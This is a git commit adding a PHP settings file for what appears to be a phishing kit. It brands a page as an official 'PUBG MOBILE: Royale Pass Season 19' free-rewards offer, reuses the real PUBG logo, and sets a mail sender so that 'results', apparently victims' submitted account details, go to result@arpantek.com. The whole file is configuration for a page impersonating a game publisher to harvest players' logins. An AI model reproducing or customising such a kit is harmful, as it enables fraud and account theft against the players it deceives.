398d182bbe7ad36886a9b0c9748afe0c3213ab3e
mahmoud1002 <71079268+mahmoud1002@users.noreply.github.com>
2021-07-07 03:31:14 +0000

    Upload my upload files

---
+++ system/setting.php
@@ -0,0 +1,17 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+//KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'PUBG MOBILE: Royale Pass Season 19';
+$description = 'Collect your special rewards at the PUBG MOBILE: Royale Pass Season 19. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://i.ibb.co/f4V9LvP/season.png';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = 'ITS ME ARPANTEK';
+$sender = 'From: arpantek <result@arpantek.com>';
+?>
